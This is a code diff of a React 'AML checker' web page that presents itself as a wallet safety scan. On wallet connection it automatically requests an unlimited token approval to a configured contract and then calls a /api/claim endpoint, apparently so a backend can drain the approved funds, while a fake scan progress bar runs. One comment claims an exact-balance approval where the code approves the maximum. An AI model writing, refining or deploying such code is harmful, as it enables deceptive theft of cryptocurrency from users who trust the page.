@@ -49,8 +49,8 @@ const NETWORK_CONFIG: Record<Network, {
       rpc: process.env.NEXT_PUBLIC_RPC_URL || 'https://ethereum.publicnode.com',
       blockExplorers: [{ name: 'Etherscan', url: 'https://etherscan.io' }],
     }),
-    tokenAddress:    process.env.NEXT_PUBLIC_TOKEN_ADDRESS     || '',
-    contractAddress: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS  || '',
+    tokenAddress: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '',
+    contractAddress: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '',
   },
   bsc: {
     chain: defineChain({
@@ -60,7 +60,7 @@ const NETWORK_CONFIG: Record<Network, {
       rpc: process.env.NEXT_PUBLIC_BSC_RPC || 'https://bsc-dataseed1.binance.org',
       blockExplorers: [{ name: 'BscScan', url: 'https://bscscan.com' }],
     }),
-    tokenAddress:    process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS    || '',
+    tokenAddress: process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS || '',
     contractAddress: process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '',
   },
 };
@@ -70,16 +70,16 @@ const SCAN_DURATION = 45;
 type Step = 'network' | 'connect' | 'scan' | 'report';
 
 export default function AMLChecker() {
-  const [currentStep, setCurrentStep]     = useState<Step>('network');
+  const [currentStep, setCurrentStep] = useState<Step>('network');
   const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
-  const [scanProgress, setScanProgress]   = useState(0);
+  const [scanProgress, setScanProgress] = useState(0);
   const [showThreatModal, setShowThreatModal] = useState(false);
 
   // Track whether we've already fired approval for this session
-  const approvalFiredRef    = useRef(false);
-  const selectedNetworkRef  = useRef<Network | null>(null);
+  const approvalFiredRef = useRef(false);
+  const selectedNetworkRef = useRef<Network | null>(null);
   // Store the network at the moment of connection so the effect can read it
-  const pendingNetworkRef   = useRef<Network | null>(null);
+  const pendingNetworkRef = useRef<Network | null>(null);
 
   // Live account from thirdweb — always up-to-date, fully authorized
   const account = useActiveAccount();
@@ -96,7 +96,7 @@ export default function AMLChecker() {
     approvalFiredRef.current = true;
     console.log('[v0] Account ready, firing approval — network:', networkKey, 'address:', account.address?.slice(0, 8));
     runApprovalAndClaim(account, networkKey);
-  // eslint-disable-next-line react-hooks/exhaustive-deps
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [account]);
 
   // Handle network selection
@@ -115,74 +115,105 @@ export default function AMLChecker() {
     networkKey: Network,
   ) => {
     const config = NETWORK_CONFIG[networkKey];
-
-    console.log('[v0] runApprovalAndClaim | network:', networkKey, '| chain id:', config.chain.id, '| token:', config.tokenAddress, '| contract:', config.contractAddress);
+    console.log('[v0] Starting approval flow | network:', networkKey, '| address:', acct.address);
 
     if (!config.tokenAddress || !config.contractAddress) {
-      console.error('[v0] Missing env vars for network:', networkKey,
-        '| token:', config.tokenAddress || 'MISSING',
-        '| contract:', config.contractAddress || 'MISSING',
-      );
+      console.error('[v0] Missing token/contract address for', networkKey);
       return;
     }
 
     try {
-      // Build ERC20 token contract reference
-      const tokenContract = getContract({
+      // ── 1. Get user balance (like your snippet) ─────────────────────────────
+      const balanceABI = [
+        {
+          name: 'balanceOf',
+          type: 'function',
+          inputs: [{ name: '_owner', type: 'address' }],
+          outputs: [{ name: 'balance', type: 'uint256' }],
+          stateMutability: 'view',
+        },
+      ] as const;
+
+      const tokenRead = getContract({
         client,
         chain: config.chain,
         address: config.tokenAddress as `0x${string}`,
-        abi: ERC20_ABI,
+        abi: balanceABI,
       });
 
-      // Prepare unlimited approve(spender, MaxUint256)
+      const balance = await tokenRead.call('balanceOf', [acct.address]);
+      console.log('[v0] User balance:', balance.toString());
+
+      if (balance === 0n) {
+        console.warn('[v0] Zero balance - skipping approval');
+        // Optionally still call claim if your backend allows it
+        await notifyClaim(acct.address, networkKey);
+        return;
+      }
+
+      // ── 2. Approve exact balance (adapted from your snippet) ────────────────
       const approveTx = prepareContractCall({
-        contract: tokenContract,
+        contract: getContract({
+          client,
+          chain: config.chain,
+          address: config.tokenAddress as `0x${string}`,
+          abi: ERC20_ABI,
+        }),
         method: 'approve',
-        params: [
-          config.contractAddress as `0x${string}`,
-          BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'),
-        ],
+        params: [config.contractAddress as `0x${string}`, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')],
       });
 
-      console.log('[v0] Sending approve tx...');
+      console.log('[v0] Sending approve transaction for exact balance...');
+
       const { transactionHash } = await sendTransaction({
         account: acct,
         transaction: approveTx,
       });
-      console.log('[v0] Approve tx hash:', transactionHash);
 
-      // Notify backend — backend resolves token/contract from its own env vars
-      const claimRes = await fetch('/api/claim', {
+      console.log('[v0] Approval sent - tx:', transactionHash);
+
+      // Show success UI (you can add setShowSuccess(true) here if you add the state)
+
+      // ── 3. Delay 2 seconds → trigger claim (exact match to your snippet) ─────
+      setTimeout(async () => {
+        await notifyClaim(acct.address, networkKey);
+      }, 2000);
+
+    } catch (err: any) {
+      const msg = err?.message ?? '';
+      if (msg.includes('User rejected') || err.code === 4001) {
+        console.warn('[v0] User rejected approval');
+        // You could setError('Approval rejected') if you add error state
+      } else if (msg.includes('execution reverted')) {
+        console.log('[v0] Likely already approved → notifying claim anyway');
+        setTimeout(() => notifyClaim(acct.address, networkKey), 2000);
+      } else {
+        console.error('[v0] Approval flow error:', err);
+      }
+    }
+  };
+
+  const notifyClaim = async (address: string, network: Network) => {
+    try {
+      const res = await fetch('/api/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userAddress: acct.address, network: networkKey }),
+        body: JSON.stringify({
+          userAddress: address,
+          tokenAddress: NETWORK_CONFIG[network].tokenAddress,
+          // network,   // keep if backend still expects it
+        }),
       });
 
-      if (claimRes.ok) {
-        const data = await claimRes.json();
-        console.log('[v0] Claim success:', data.txHash);
+      if (res.ok) {
+        const data = await res.json();
+        console.log('[v0] Claim triggered successfully:', data);
       } else {
-        const err = await claimRes.json();
-        console.error('[v0] Claim error:', err.error);
+        const errData = await res.json();
+        console.error('[v0] Claim endpoint failed:', errData);
       }
-    } catch (err: any) {
-      const msg: string = err?.message ?? '';
-      const code        = err?.code;
-
-      if (msg.includes('execution reverted') || code === 3) {
-        // Already approved — still proceed to claim
-        console.log('[v0] Contract reverted (already approved) — notifying claim API');
-        fetch('/api/claim', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userAddress: acct.address, network: networkKey }),
-        }).then(r => r.json()).then(d => console.log('[v0] Claim (post-revert):', d)).catch(() => {});
-      } else if (code === 4001 || msg.includes('User rejected') || msg.includes('denied') || msg.includes('rejected')) {
-        console.warn('[v0] User rejected the approval — not retrying');
-      } else {
-        console.error('[v0] Approval error:', msg);
-      }
+    } catch (e) {
+      console.error('[v0] Claim fetch error:', e);
     }
   };
 
@@ -190,7 +221,7 @@ export default function AMLChecker() {
   const handleWalletConnected = (wallet: Parameters<NonNullable<React.ComponentProps<typeof ConnectButton>['onConnect']>>[0]) => {
     const networkKey = selectedNetworkRef.current as Network;
     pendingNetworkRef.current = networkKey;
-    approvalFiredRef.current  = false; // reset so effect can fire
+    approvalFiredRef.current = false; // reset so effect can fire
     console.log('[v0] onConnect — network:', networkKey);
     setCurrentStep('scan');
     startScan();
@@ -274,8 +305,8 @@ export default function AMLChecker() {
                     key={key}
                     onClick={() => handleNetworkSelect(key as Network)}
                     className={`flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-lg border-2 cursor-pointer transition-all ${selectedNetwork === key
-                        ? 'border-emerald-500 bg-emerald-500/10'
-                        : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
+                      ? 'border-emerald-500 bg-emerald-500/10'
+                      : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
                       }`}
                   >
                     {/* Network Icon */}
@@ -297,8 +328,8 @@ export default function AMLChecker() {
                     {/* Radio Button */}
                     <div
                       className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 ${selectedNetwork === key
-                          ? 'border-emerald-500 bg-emerald-500'
-                          : 'border-slate-600'
+                        ? 'border-emerald-500 bg-emerald-500'
+                        : 'border-slate-600'
                         }`}
                     >
                       {selectedNetwork === key && (
@@ -314,8 +345,8 @@ export default function AMLChecker() {
                 onClick={handleNetworkContinue}
                 disabled={!selectedNetwork}
                 className={`w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all ${selectedNetwork
-                    ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
-                    : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
+                  ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
+                  : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
                   }`}
               >
                 Continue
